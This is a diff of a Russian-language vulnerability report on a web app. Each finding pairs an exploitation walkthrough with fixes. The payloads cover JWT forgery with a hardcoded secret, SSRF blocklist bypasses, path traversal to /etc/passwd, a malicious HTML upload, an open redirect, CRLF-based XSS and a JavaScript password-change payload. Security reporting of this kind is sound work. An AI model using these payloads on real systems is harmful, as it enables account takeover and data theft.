@@ -12,7 +12,7 @@
 **Эксплуатация:**
 
 Уязвимый код:
-```
+```Py
 JWT_SECRET = "funkymonkey"
 JWT_ALGORITHM = "HS256"
 
@@ -30,7 +30,7 @@ def auth_required(f):
     return wrapper
 ```
 1. Создаем токен для последующей подписи:
-```
+```JSON
 {
   "sub": "admin",
   "role": "admin",
@@ -39,7 +39,7 @@ def auth_required(f):
 }
 ```
 2. Подписываем и генерируем токен: (тут я предполагаю, что у нас уже есть секрет, либо нашли перебором, либо взяли из утечки кода)
-```
+```Py
 import jwt, time
 
 secret = "funkymonkey"
@@ -55,9 +55,11 @@ token = jwt.encode({
 
 **Рекомендации по устранению:**
 1. Хранить секрет в переменных окружения (точное значение секрета останется в переменной окружения, даже при условии утечки кода)
-``` JWT_SECRET = os.environ["JWT_SECRET"] ```
-2. Поменять секрет на рандомный и более сильный (тогда мы защитимся от подбора секрета). Можно сгенерировать так:
+```JSON
+ JWT_SECRET = os.environ["JWT_SECRET"]
 ```
+3. Поменять ключ на рандомный и более сильный (тогда мы защитимся от подбора ключа). Можно сгенерировать так:
+```py
 openssl rand -hex 64
 ```
 3. Сменить тип шифрования на асимметричный (к примеру RS256) (приватный ключ остается на сервере и подписать токен самостоятельно не получится).
@@ -72,7 +74,7 @@ openssl rand -hex 64
 Эксплуатация:
 
 Уязвимый код:
-```
+```Python
 block_schemes = ["file", "gopher", "expect", "php", "dict", "ftp", "glob", "data"]
 block_host = [ "127.0.0.1", "localhost", "localhost.localdomain", "local", "localdomain", 
               "::1", "ip6-localhost", "ip6-loopback", "0.0.0.0", "127.0.0.0", 
@@ -126,7 +128,7 @@ def create_product():
     db.commit()
 ```
 1. Отправляем запрос с следующим payload:
-```
+```HTTP
 POST /api/admin/create_product
 Cookie: token=<admin_jwt>
 
@@ -137,7 +139,7 @@ Cookie: token=<admin_jwt>
 }
 ```
 еще варианты для rewiews
-```
+```JSON
 {
   "reviews":"http://[::ffff:127.0.0.1]:5000/metrics"
   "reviews":"http:127.0.0.1:5000/metrics"
@@ -148,13 +150,13 @@ Cookie: token=<admin_jwt>
 Рекомендации по устранению:
 1. Использовать белые списки вместо черных списков. (заменить block_schemes и block_host на allowed_schemes и allowed_host к примеру)
 2. Если возможно, то поменять дизайн обращения к этому endpoint. Сделать так, чтобы пользователь контролировал к примеру id у отзывов, но не полноценный url
-```
+```JSON
 {
   "review_id":"123"
 }
 ```
 и уже сервер строит путь 
-```
+```JSON
 url = f"https://reviews.internal/api/{review_id}"
 ```
 
@@ -168,7 +170,7 @@ url = f"https://reviews.internal/api/{review_id}"
 
 Эксплуатация:
 Уязвимый код:
-```
+```Python
 @app.route("/api/admin/view", methods=["GET"])
 @admin_required
 def view_file():
@@ -200,7 +202,7 @@ def view_file():
         return jsonify(error=f"error reading file {str(e)}"), 400
 ```
 1. Отправляем следующий запрос:
-```
+```HTTP
 GET /api/admin/view?file=..%252f..%252fapp.py
 or
 GET /api/admin/view?file=/etc/passwd
@@ -209,12 +211,12 @@ GET /api/admin/view?file=/etc/passwd
 
 Рекомендации по устранению:
 1. Не принимать абсолютные пути
-```
+```Python
 if os.path.isabs(filename):
     abort(403)
 ```
 2. Ввести ограничение пути
-```
+```Python
 base = os.path.abspath(UPLOAD_FOLDER)
 target = os.path.abspath(os.path.join(base, filename))
 
@@ -235,7 +237,7 @@ if not target.startswith(base):
 
 Эксплуатация:
 Уязвимый код:
-```
+```Python
 @app.route("/api/admin/upload", methods=["POST"])
 @admin_required
 @csrf_protect
@@ -265,7 +267,7 @@ def upload_file():
     return jsonify({"message": "file has been successfully uploaded"}), 200
 ```
 1. Создаем файл poc.png
-```
+```HTML
 <html>
 <body style="font-family:sans-serif">
 
@@ -282,7 +284,7 @@ def upload_file():
 
 Рекомендации по устранению:
 1. Ввести валидацию MIME типа файла: 
-```
+```Python
 import magic
 
 ALLOWED_MIME = {
@@ -308,12 +310,12 @@ def upload_file():
 ```
 2. Не использовать оригинальные имена файлов, чтобы было сложнее к ним обратиться (```uuid.uuid4().hex```)
 3. Хранить файлы в специальной директории, где они будут не исполняемые. К примеру:
-```
+```HTTP
 https://target.com/uploads/poc.png
 ```
 Тут мы можем достучаться до файла извне, а если поместить файлы в директорию внутри сервера, то это будет невозможным (```/opt/app/private_uploads/``` или ```/home/app/uploads/```)
 А отдавать файлы лучше через отдельный хендлер, где уже проверяются права, существование файла и потом бек его отдает:
-```
+```Python
 @app.route("/download/<file_id>")
 def download(file_id):
     filename = get_filename_from_db(file_id)
@@ -334,7 +336,7 @@ def download(file_id):
 
 Эксплуатация:
 Уязвимый код:
-```
+```Python
 def hash_password(pw):
     return hashlib.sha256(pw.encode()).hexdigest()
 ```
@@ -343,7 +345,7 @@ def hash_password(pw):
 
 Рекомендации по устранению:
 1. Использовать библиотеку argon, чтобы хешировать пароли, а не шифровать (сама библиотека уже использует соль и надежный алгоритм шифрования)
-```
+```Python
 from argon2 import PasswordHasher
 
 ph = PasswordHasher()
@@ -370,7 +372,7 @@ except:
 
 Эксплуатация:
 Уязвимый код:
-```
+```Python
 if path == "/go":
             qs = environ.get("QUERY_STRING", "")
             target = urllib.parse.parse_qs(qs).get("url", ["/"])[0]
@@ -384,19 +386,19 @@ if path == "/go":
         return self.wsgi(environ, start_response)
 ```
 1. Вариант использования чисто редиректа:
-```
+```HTTP
 /go?url=https://evil.com
 ```
 (Пользователь с доверенного сайта переходит на сайт злоумышленника)
 2. Вариант использования с XSS
-```
+```HTTP
 GET /go?url=%0d%0aContent-Type:%20text/html%0d%0a%0d%0a%3cscript%3ealert%28%29%3c%2fscript%3e HTTP/1.1
 ```
 
 Рекомендации по устранению:
 1. Использовать белый список
 2. Разрешать только внутренние пути на сайт
-```
+```Python
 if not target.startswith("/"):
     abort(400)
 ```
@@ -410,7 +412,7 @@ if not target.startswith("/"):
 
 Эксплуатация:
 Уязвимый код:
-```
+```Python
 def set_auth_cookies(resp, username, role):
     token = issue_token(username, role)
     resp.set_cookie("token", token, httponly=True, samesite="None", max_age=JWT_TTL)
@@ -419,7 +421,7 @@ def set_auth_cookies(resp, username, role):
 ```
 1. Подделываем JWT токен админа
 2. Отправляем следующую полезную нагрузку в параметре url в редиректе:
-```
+```JS
 const csrf_token = document.cookie.split('=')[1];
 const response = fetch('/api/settings/password', {
     method: 'POST',
@@ -435,6 +437,55 @@ const response = fetch('/api/settings/password', {
 1. Поставить дополнительные флаги на токен, чтобы его нельзя было читать через js
 ```
 resp.set_cookie("_csrf", value, httponly=True, samesite="Strict", secure=True)
+```
+2. Привязать токен к пользователю и проверять принадлежность токена, чтобы нельзя было установить произвольный токен жертве.
+Создать дополнительную таблицу при инициализации бд
+```Python
+db.execute("""
+    CREATE TABLE IF NOT EXISTS csrf_tokens (
+        username TEXT PRIMARY KEY,
+        token TEXT NOT NULL,
+        expires INTEGER NOT NULL
+    )
+""")
+db.commit()
+```
+Изменить функцию set_auth_cookies:
+```Python
+def set_auth_cookies(resp, username, role):
+    token = issue_token(username, role)
+    csrf_raw = secrets.token_hex(32)
+    resp.set_cookie("token", token, httponly=True, samesite="Strict", max_age=JWT_TTL, secure=True)
+    resp.set_cookie("_csrf", csrf_raw, httponly=True, samesite="Strict", max_age=JWT_TTL, secure=True)
+
+    expires = int(time.time()) + JWT_TTL
+    db.execute(
+        "INSERT OR REPLACE INTO csrf_tokens (username, token, expires) VALUES (?, ?, ?)",
+        (username, csrf_raw, expires)
+    )
+    db.commit()
+    return resp
+```
+Изменить функцию csrf_protect: (чтобы принадлежность тоже проверялась)
+```Python
+def csrf_protect(f):
+    @wraps(f)
+    def wrapper(*args, **kwargs):
+        ct = request.cookies.get("_csrf", "")
+        ft = request.headers.get("X-CSRF-Token", "") or request.form.get("_csrf", "")
+        if not ct or ct != ft:
+            return jsonify(error="csrf token mismatch"), 403
+
+        username = g.user["sub"]  # g.user уже заполнен в @auth_required
+        row = db.execute(
+            "SELECT token FROM csrf_tokens WHERE username = ? AND token = ? AND expires > ?",
+            (username, ct, int(time.time()))
+        ).fetchone()
+        if not row:
+            return jsonify(error="csrf token invalid or expired"), 403
+
+        return f(*args, **kwargs)
+    return wrapper
 ```
 
 ---
